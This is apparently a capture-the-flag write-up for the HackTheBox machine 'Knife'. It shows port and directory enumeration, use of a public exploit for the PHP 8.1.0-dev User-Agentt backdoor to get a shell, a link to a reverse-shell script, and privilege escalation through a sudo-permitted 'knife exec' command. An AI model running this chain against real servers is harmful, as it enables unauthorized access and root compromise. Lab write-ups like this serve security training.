# Knife - HackTheBox - Easy

## Enumeration
### 01 Nmap scan
```bash
┌──(hanoz㉿kali)-[~/Desktop/htb/challenges/HTBoxes]
└─$ nmap -sV -sC -p22,80 10.10.10.242                                                                          130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-19 19:28 EST
Nmap scan report for 10.10.10.242
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds
```
It seems we have a web server, and SSH open, so let's enumerate the web server

### Sub-domains on web-server
```bash
┌──(hanoz㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.242/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.242/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/19 19:29:54 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 5815]
/server-status        (Status: 403) [Size: 277] 
                                                
===============================================================
2021/11/19 19:30:01 Finished
===============================================================
```

### Observing the page
So we try and read through the source code of the page, and it seems there is nothing of use there, it's a static page

### Observing in burp
```text
HTTP/1.1 200 OK
Date: Sat, 20 Nov 2021 14:18:44 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Connection: close
Content-Type: text/html; charset=UTF-8
```
These are the response headers for the page, it seems we are running PHP/8.1.0-dev

Let's check on searchsploit for this and apache 2.4 too. 
```text
┌──(hanoz㉿kali)-[~/Desktop/htb/challenges/HTBoxes]
└─$ searchsploit apache 2.4.41
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution                    | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner                  | php/remote/29316.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                                | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow               | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)         | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)         | unix/remote/47080.c
Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Traversal                | linux/webapps/39642.txt
Apache Tomcat < 5.5.17 - Remote Directory Listing                                  | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                                | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                          | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                       | linux/dos/36906.txt
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution   | linux/remote/34.pl
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
There's a few RCE's, but they requre older PHP, and mostly Tomcat vulns, not very interesting, let's check PHP vulns
```html
┌──(hanoz㉿kali)-[~/Desktop/htb/challenges/HTBoxes]
└─$ searchsploit PHP 8.1.0-dev
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
.
.
.
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                | php/webapps/49933.py
.
.
.
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We found something useful, lets see what it is
```text
PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
```
Sounds like what we want,
let's use it

Okay, we have a shell!
```shell
┌──(hanoz㉿kali)-[~/…/htb/challenges/HTBoxes/knife]
└─$ python3 49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ whoami
james
```

It seems we have a user james. 
```bash
$ cat /home/james/user.txt
****************************

```

The shell however is cap, so let's try and get a better shell

Okay, so after a bit of research, I found a github with the python script for a reverse shell RCE so I'm using that
```url
https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/revshell_php_8.1.0-dev.py
```

Now let's try and get root

So first we do sudo -l
We see we have access to knife
```bash
james@knife:/$ sudo -l 
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Okay, from knife documentation, we see the following article
```text
https://docs.chef.io/workstation/knife_exec/
```

So we can run ruby scripts easily. We construct a basic ruby script to read the root flag, and we pass it

```text
james@knife:/$ sudo /usr/bin/knife exec -E "exec 'cat /root/root.txt'"      
sudo /usr/bin/knife exec -E "exec 'cat /root/root.txt'"
************************************
```

Great! It worked! We can also get root shell, but our objective is already achieved.